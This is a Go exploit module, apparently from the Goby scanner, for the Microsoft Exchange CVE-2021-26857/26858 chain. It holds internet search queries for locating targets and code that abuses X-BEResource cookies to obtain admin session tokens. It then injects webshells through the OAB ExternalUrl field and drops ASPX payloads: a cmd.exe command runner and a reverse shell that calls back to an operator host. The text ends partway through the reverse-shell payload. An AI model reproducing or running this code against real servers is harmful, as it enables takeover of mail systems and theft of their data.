package exploits

import (
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Exchange Server remote code execution vulnerability (CVE-2021-26857/CVE-2021-26858)",
    "Description": "<p>Microsoft Exchange Server is a suite of e-mail services programs from Microsoft Corporation of the United States. It provides mail access, storage, forwarding, voicemail, email filtering and filtering functions.</p><p>Microsoft Exchange Server has a remote command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Microsoft-Exchange",
    "Homepage": "https://www.microsoft.com/zh-cn/microsoft-365/exchange/email",
    "DisclosureDate": "2021-02-08",
    "Author": "twcjw",
    "FofaQuery": "banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\" && cert!=\"Technicolor\") || banner=\"Set-Cookie: OutlookSession\" || (((header=\"owa\" && (header=\"Location\" || header=\"X-Owa-Version\" || header=\"Set-Cookie: OWA-COOKIE\")) || (body=\"href=\\\"/owa/auth/\" && (title=\"Outlook\" || title=\"Exchange \" || body=\"var a_sLgn\" || body=\"aria-label=\\\"Outlook Web App\\\" class=\\\"signInImageHeader\"))) && header!=\"WordPress\" && body!=\"wp-content\" && body!=\"wp-includes\") || body=\"<!-- owapage = ASP.auth_logon_aspx\" || header=\"x-owa-version\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title=\"Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\")",
    "GobyQuery": "banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\" && cert!=\"Technicolor\") || banner=\"Set-Cookie: OutlookSession\" || (((header=\"owa\" && (header=\"Location\" || header=\"X-Owa-Version\" || header=\"Set-Cookie: OWA-COOKIE\")) || (body=\"href=\\\"/owa/auth/\" && (title=\"Outlook\" || title=\"Exchange \" || body=\"var a_sLgn\" || body=\"aria-label=\\\"Outlook Web App\\\" class=\\\"signInImageHeader\"))) && header!=\"WordPress\" && body!=\"wp-content\" && body!=\"wp-includes\") || body=\"<!-- owapage = ASP.auth_logon_aspx\" || header=\"x-owa-version\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title=\"Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\")",
    "Level": "2",
    "Impact": "<p>Microsoft Exchange Server has a remote code execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.microsoft.com/zh-cn/microsoft-365/exchange/email\">https://www.microsoft.com/zh-cn/microsoft-365/exchange/email</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/sirpedrotavares/Proxylogon-exploit"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "email",
            "type": "input",
            "value": "administrator@victim.corp",
            "show": ""
        },
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,antsword,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello.aspx",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%@ Page Language=\"C#\" %><%= \"Hello, World!\" %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2021-26857",
        "CVE-2021-26858"
    ],
    "CNNVD": [
        "CNNVD-202103-191",
        "CNNVD-202103-189"
    ],
    "CNVD": [
        "CNVD-2021-14812",
        "CNVD-2021-14811"
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "Exchange Server 远程代码执行漏洞（CVE-2021-26857/CVE-2021-26858）",
            "Product": "Microsoft-Exchange",
            "Description": "<p>Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。</p><p>Microsoft Exchange Server 存在远程命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.microsoft.com/zh-cn/microsoft-365/exchange/email\">https://www.microsoft.com/zh-cn/microsoft-365/exchange/email</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Microsoft Exchange Server 存在远程命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Exchange Server remote code execution vulnerability (CVE-2021-26857/CVE-2021-26858)",
            "Product": "Microsoft-Exchange",
            "Description": "<p>Microsoft Exchange Server is a suite of e-mail services programs from Microsoft Corporation of the United States. It provides mail access, storage, forwarding, voicemail, email filtering and filtering functions.<br></p><p>Microsoft Exchange Server has a remote command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.microsoft.com/zh-cn/microsoft-365/exchange/email\">https://www.microsoft.com/zh-cn/microsoft-365/exchange/email</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Microsoft Exchange Server has a remote code execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-04",
    "PocId": "10706"
}`
	var randomName string
	randomName = goutils.RandomHexString(4) + ".js"
	// 构造 GET 包结构，用于初次获取 FQDN
	constructFqdnPacketG37RdFYc8 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		// 构造获取 FQDN 的包
		fqdnConfig := httpclient.NewGetRequestConfig("/ecp/" + randomName)
		fqdnConfig.VerifyTls = false
		fqdnConfig.FollowRedirect = false
		fqdnConfig.Header.Store("Cookie", "X-BEResource=localhost~1942062522")
		return httpclient.DoHttpRequest(hostInfo, fqdnConfig)
	}
	fetchFqdnG37RdFYc8 := func(hostInfo *httpclient.FixUrl) (string, error) {
		// 发包拿到 FQDN 的值
		resp, err := constructFqdnPacketG37RdFYc8(hostInfo)
		if err != nil {
			return "", err
		} else if resp != nil && resp.Header.Get("X-FEServer") != "" {
			return resp.Header.Get("X-FEServer"), nil
		}
		return "", errors.New("漏洞利用失败")
	}
	// 构造 POST 包，用 map 的形式，去获取不同的参数时，有不同的 header 头，调用的时候自行填入。
	constructPostPacketG37RdFYc8 := func(hostInfo *httpclient.FixUrl, headers map[string]string, data string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/ecp/" + randomName)
		postConfig.VerifyTls = false
		postConfig.FollowRedirect = false
		for key, value := range headers {
			postConfig.Header.Store(key, value)
		}
		postConfig.Data = data
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}
	generateGetUserIdPayloadG37RdFYc8 := func(hostInfo *httpclient.FixUrl, email, choseType, fqdn string) (string, error) {
		// 发包获取 LegacyDN、Server ID 的值。用获取到的 legacyDN、Server ID，生成用于获取 userID 的 payload
		var legacyDN, serverID string
		resp, err := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
			"Cookie":       "X-BEResource=" + fqdn + "/autodiscover/autodiscover.xml?a=~1942062522;",
			"Content-Type": "text/xml",
		}, "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>"+email+"</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>")
		if err != nil {
			return "", err
		} else if (resp != nil && resp.StatusCode != 200) || !strings.Contains(resp.Utf8Html, "<LegacyDN>") || !strings.Contains(resp.Utf8Html, "<Server>") {
			return "", errors.New("漏洞利用失败")
		}
		// 提取 LegacyDN
		legacyDNSplit := strings.Split(resp.Utf8Html, "<LegacyDN>")
		if len(legacyDNSplit) > 1 {
			legacyDNEndSplit := strings.Split(legacyDNSplit[1], "</LegacyDN>")
			if len(legacyDNEndSplit) > 0 {
				legacyDN = legacyDNEndSplit[0]
			}
		} else {
			return "", errors.New("漏洞利用失败")
		}
		// 提取 Server ID
		serverIDSplit := strings.Split(resp.Utf8Html, "<Server>")
		if len(serverIDSplit) > 1 {
			serverIDEndSplit := strings.Split(serverIDSplit[1], "</Server>")
			if len(serverIDEndSplit) > 0 {
				serverID = serverIDEndSplit[0]
			}
		} else {
			return "", errors.New("漏洞利用失败")
		}
		payloadByte, _ := hex.DecodeString("0000000000e4040000090400000904000000000000")
		payload := fmt.Sprintf("%s%s", legacyDN, payloadByte)
		if choseType == "payload" {
			return payload, nil
		} else if choseType == "serverID" {
			return serverID, nil
		}
		return "", errors.New("漏洞利用失败")
	}
	fetchUserIdG37RdFYc8 := func(hostInfo *httpclient.FixUrl, email, fqdn, serverId string) (string, error) {
		// 发包获取到 userID
		payload, _ := generateGetUserIdPayloadG37RdFYc8(hostInfo, email, "payload", fqdn)
		resp, err := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
			"Cookie":              "X-BEResource=Admin@" + fqdn + ":444/mapi/emsmdb?MailboxId=" + serverId + "@exchange.lab&a=~1942062522;",
			"Content-Type":        "application/mapi-http",
			"X-Requesttype":       "Connect",
			"X-Requestid":         "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
			"X-Clientinfo":        "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
			"X-Clientapplication": "Outlook/15.0.4815.1002",
		}, payload)
		if err != nil {
			return "", err
		} else if !strings.Contains(resp.Utf8Html, "act as owner of a UserMailbox") {
			return "", errors.New("漏洞利用失败")
		}
		sid := strings.Split(resp.Utf8Html, "with SID ")[1]
		sid = strings.Split(sid, " and MasterAccountSid")[0]
		return sid, nil
	}
	fetchSessionIdG37RdFYc8 := func(hostInfo *httpclient.FixUrl, choseType, fqdn, sid string) (string, error) {
		// 发包获取到 SessionId
		resp, err := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
			"Cookie":             "X-BEResource=Administrator@" + fqdn + ":444/ecp/proxyLogon.ecp?a=~1942062522;",
			"Content-Type":       "text/xml",
			"msExchLogonMailbox": sid,
		}, "<r at=\"Negotiate\" ln=\"Admin\"><s>"+sid+"</s></r>")
		if err != nil {
			return "", err
		} else if (resp != nil && resp.StatusCode != 241) || strings.Contains(resp.HeaderString.String(), "set-cookie") {
			return "", errors.New("漏洞利用失败")
		}
		sessId := resp.Cookie
		sessId = strings.Split(sessId, "ASP.NET_SessionId=")[1]
		sessId = strings.Split(sessId, ";")[0]
		msExchEcpCanary := resp.Cookie
		msExchEcpCanary = strings.Split(msExchEcpCanary, "msExchEcpCanary=")[1]
		msExchEcpCanary = strings.Split(msExchEcpCanary, ";")[0]
		if choseType == "sessId" {
			return sessId, nil
		} else if choseType == "msExchEcpCanary" {
			return msExchEcpCanary, nil
		}
		return "", errors.New("漏洞利用失败")
	}
	fetchDefaultOabG37RdFYc8 := func(hostInfo *httpclient.FixUrl, fqdn, sid, msExchEcpCanary, sessId string) (string, error) {
		// 发包获取 default oab
		resp, err := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
			"Cookie":             fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", fqdn, msExchEcpCanary, sessId, msExchEcpCanary),
			"Content-Type":       "application/json; charset=utf-8",
			"X-Requested-With":   "XMLHttpRequest",
			"msExchLogonMailbox": sid,
		}, "{\"filter\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"SelectedView\": \"\", \"SelectedVDirType\": \"All\"}}, \"sort\": {}}")
		if err != nil {
			return "", err
		} else if resp != nil && resp.StatusCode != 200 {
			return "", err
		}
		oabId := strings.Split(resp.Utf8Html, "\"RawIdentity\":\"")[1]
		oabId = strings.Split(oabId, "\"")[0]
		return oabId, nil
	}
	oabShellG37RdFYc8 := func(hostInfo *httpclient.FixUrl, fqdn, sid, msExchEcpCanary, sessId, oabId, content string) (bool, error) {
		// oab inject shell
		oabJson := fmt.Sprintf("{\"identity\": {\"__type\": \"Identity:ECP\", \"DisplayName\": \"OAB (Default Web Site)\", \"RawIdentity\": \"%s\"}, \"properties\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"ExternalUrl\": \"http://ooo/#%s\"}}}", oabId, content)
		resp, err := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
			"Cookie":             fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", fqdn, msExchEcpCanary, sessId, msExchEcpCanary),
			"Content-Type":       "application/json; charset=utf-8",
			"X-Requested-With":   "XMLHttpRequest",
			"msExchLogonMailbox": sid,
		}, oabJson)
		if err != nil {
			return false, err
		} else if resp != nil && resp.StatusCode == 200 {
			// verify shell
			verify, err := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
				"Cookie":             fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", fqdn, msExchEcpCanary, sessId, msExchEcpCanary),
				"Content-Type":       "application/json; charset=utf-8",
				"X-Requested-With":   "XMLHttpRequest",
				"msExchLogonMailbox": sid,
			}, "{\"filter\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"SelectedView\": \"\", \"SelectedVDirType\": \"All\"}}, \"sort\": {}}")
			if err != nil {
				return false, err
			} else if verify != nil && verify.StatusCode == 200 && (strings.Contains(verify.Utf8Html, "ExternalUrl") || strings.Contains(verify.Utf8Html, "Page_Load()")) {
				return true, nil
			}
		}
		return false, err
	}

	checkFileG37RdFYc8 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		// 反弹shell执行的时候，调用这个函数去访问
		checkConfig := httpclient.NewGetRequestConfig("/owa/auth/" + filename)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		checkConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}

	executeG37RdFYc8 := func(hostInfo *httpclient.FixUrl, content, filename string) (*httpclient.HttpResponse, error) {
		// 小马传进去了，在这个函数里面，传入大马，两个参数 filename和content
		executeConfig := httpclient.NewPostRequestConfig("/owa/auth/exchanges28.aspx")
		executeConfig.VerifyTls = false
		executeConfig.FollowRedirect = false
		executeConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		executeConfig.Data = "filename=C%3a\\\\Program+Files\\\\Microsoft\\\\Exchange+Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\" + filename + "&content=" + url.QueryEscape(content)
		resp, err := httpclient.DoHttpRequest(hostInfo, executeConfig)
		if err != nil {
			return nil, err
		} else if resp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		return checkFileG37RdFYc8(hostInfo, filename)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			email := "administrator@victim.corp"
			fqdn, _ := fetchFqdnG37RdFYc8(hostInfo)
			resp, _ := constructPostPacketG37RdFYc8(hostInfo, map[string]string{
				"Cookie":       "X-BEResource=" + fqdn + "/autodiscover/autodiscover.xml?a=~1942062522;",
				"Content-Type": "text/xml",
			}, "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>"+email+"</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>")
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<LegacyDN>") && strings.Contains(resp.Utf8Html, "<Server>")
		},

		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			cmd := goutils.B2S(stepLogs.Params["cmd"])
			email := goutils.B2S(stepLogs.Params["email"])
			filename := goutils.B2S(stepLogs.Params["filename"])
			content := goutils.B2S(stepLogs.Params["content"])
			waitSessionCh := make(chan string)
			if attackType == "cmd" {
				filename = "comexchange.aspx"
				content = "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><script runat=\"server\">    void Page_Load(object sender, EventArgs e)    {        ExecuteCommand(\"" + cmd + "\");    }    void ExecuteCommand(string command)    {        Process process = new Process();        process.StartInfo.FileName = \"cmd.exe\";        process.StartInfo.Arguments = \"/c \" + command;        process.StartInfo.UseShellExecute = false;        process.StartInfo.RedirectStandardOutput = true;        process.StartInfo.CreateNoWindow = true;        process.Start();        string result = process.StandardOutput.ReadToEnd();        process.WaitForExit();        Response.Write(result);    }</script>"
			} else if attackType == "reverse" {
				filename = goutils.RandomHexString(6) + ".aspx"
				// 用代码反弹
				rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Output = err.Error()
					}
					addr = ips[0].String()
				}
				content = "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Runtime.InteropServices\" %>\n<%@ Import Namespace=\"System.Net\" %>\n<%@ Import Namespace=\"System.Net.Sockets\" %>\n<%@ Import Namespace=\"System.Security.Principal\" %>\n<%@ Import Namespace=\"System.Data.SqlClient\" %>\n<script runat=\"server\">\n\tprotected void Page_Load(object sender, EventArgs e)\n    {\n\t    String host = \"" + addr + "\";\n            int port = " + rp + ";       \n        CallbackShell(host, port);\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct STARTUPINFO\n    {\n        public int cb;\n        public String lpReserved;\n        public String lpDesktop;\n        public String lpTitle;\n        public uint dwX;\n        public uint dwY;\n        public uint dwXSize;\n        public uint dwYSize;\n        public uint dwXCountChars;\n        public uint dwYCountChars;\n        public uint dwFillAttribute;\n        public uint dwFlags;\n        public short wShowWindow;\n        public short cbReserved2;\n        public IntPtr lpReserved2;\n        public IntPtr hStdInput;\n        public IntPtr hStdOutput;\n        public IntPtr hStdError;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_INFORMATION\n    {\n        public IntPtr hProcess;\n        public IntPtr hThread;\n        public uint dwProcessId;\n        public uint dwThreadId;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct SECURITY_ATTRIBUTES\n    {\n        public int Length;\n        public IntPtr lpSecurityDescriptor;\n        public bool bInheritHandle;\n    }\n    [DllImport(\"kernel32.dll\")]\n    static extern bool CreateProcess(string lpApplicationName,\n       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,\n       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,\n       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,\n       [In] ref STARTUPINFO lpStartupInfo,\n       out PROCESS_INFORMATION lpProcessInformation);\n    public static uint INFINITE = 0xFFFFFFFF;\n    [DllImport(\"kernel32\", SetLastError = true, ExactSpelling = true)]\n    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);\n    internal struct sockaddr_in\n    {\n        public short sin_family;\n        public short sin_port;\n        public int sin_addr;\n        public long sin_zero;\n    }\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr GetStdHandle(int nStdHandle);\n    [DllImport(\"kernel32.dll\")]\n    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);\n    public const int STD_INPUT_HANDLE = -10;\n    public const int STD_OUTPUT_HANDLE = -11;\n    public const int STD_ERROR_HANDLE = -12;\n    [DllImport(\"kernel32\")]\n    static extern bool AllocConsole();\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,\n                                            [In] SocketType socketType,\n                                            [In] ProtocolType protocolType,\n                                            [In] IntPtr protocolInfo, \n                                            [In] uint group,\n                                            [In] int flags\n                                            );\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n    internal static extern int inet_addr([In] string cp);\n    [DllImport(\"ws2_32.dll\")]\n    private static extern string inet_ntoa(uint ip);\n\n    [DllImport(\"ws2_32.dll\")]\n    private static extern uint htonl(uint ip);\n    \n    [DllImport(\"ws2_32.dll\")]\n    private static extern uint ntohl(uint ip);\n    \n    [DllImport(\"ws2_32.dll\")]\n    private static extern ushort htons(ushort ip);\n    \n    [DllImport(\"ws2_32.dll\")]\n    private static extern ushort ntohs(ushort ip);   \n\n    \n   [DllImport(\"WS2_32.dll\", CharSet=CharSet.Ansi, SetLastError=true)]\n   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n   internal static extern int send(\n                                [In] IntPtr socketHandle,\n                                [In] byte[] pinnedBuffer,\n                                [In] int len,\n                                [In] SocketFlags socketFlags\n                                );\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n   internal static extern int recv(\n                                [In] IntPtr socketHandle,\n                                [In] IntPtr pinnedBuffer,\n                                [In] int len,\n                                [In] SocketFlags socketFlags\n                                );\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n   internal static extern int closesocket(\n                                       [In] IntPtr socketHandle\n                                       );\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n   internal static extern IntPtr accept(\n                                  [In] IntPtr socketHandle,\n                                  [In, Out] ref sockaddr_in socketAddress,\n                                  [In, Out] ref int socketAddressSize\n                                  );\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n   internal static extern int listen(\n                                  [In] IntPtr socketHandle,\n                                  [In] int backlog\n                                  );\n\n    [DllImport(\"WS2_32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]\n   internal static extern int bind(\n                                [In] IntPtr socketHandle,\n                                [In] ref sockaddr_in  socketAddress,\n                                [In] int socketAddressSize\n                                );\n\n\n   public enum TOKEN_INFORMATION_CLASS\n   {\n       TokenUser = 1,\n       TokenGroups,\n       TokenPrivileges,\n       TokenOwner,\n       TokenPrimaryGroup,\n       TokenDefaultDacl,\n       TokenSource,\n       TokenType,\n       TokenImpersonationLevel,\n       TokenStatistics,\n       TokenRestrictedSids,\n       TokenSessionId\n   }\n\n   [DllImport(\"advapi32\", CharSet = CharSet.Auto)]\n   public static extern bool GetTokenInformation(\n       IntPtr hToken,\n       TOKEN_INFORMATION_CLASS tokenInfoClass,\n       IntPtr TokenInformation,\n       int tokeInfoLength,\n       ref int reqLength);\n\n   public enum TOKEN_TYPE\n   {\n       TokenPrimary = 1,\n       TokenImpersonation\n   }\n\n   public enum SECURITY_IMPERSONATION_LEVEL\n   {\n       SecurityAnonymous,\n       SecurityIdentification,\n       SecurityImpersonation,\n       SecurityDelegation\n   }\n\n   \n   [DllImport(\"advapi32.dll\", EntryPoint = \"CreateProcessAsUser\", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]\n   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,\n       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,\n       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n\n   [DllImport(\"advapi32.dll\", EntryPoint = \"DuplicateTokenEx\")]\n   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,\n       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,\n       ref IntPtr DuplicateTokenHandle);\n\n   \n\n   const int ERROR_NO_MORE_ITEMS = 259;\n\n   [StructLayout(LayoutKind.Sequential)]\n   struct TOKEN_USER\n   {\n       public _SID_AND_ATTRIBUTES User;\n   }\n\n   [StructLayout(LayoutKind.Sequential)]\n   public struct _SID_AND_ATTRIBUTES\n   {\n       public IntPtr Sid;\n       public int Attributes;\n   }\n\n   [DllImport(\"advapi32\", CharSet = CharSet.Auto)]\n   public extern static bool LookupAccountSid\n   (\n       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,\n       IntPtr pSid,\n       StringBuilder Account,\n       ref int cbName,\n       StringBuilder DomainName,\n       ref int cbDomainName,\n       ref int peUse \n\n   );\n\n   [DllImport(\"advapi32\", CharSet = CharSet.Auto)]\n   public extern static bool ConvertSidToStringSid(\n       IntPtr pSID,\n       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string 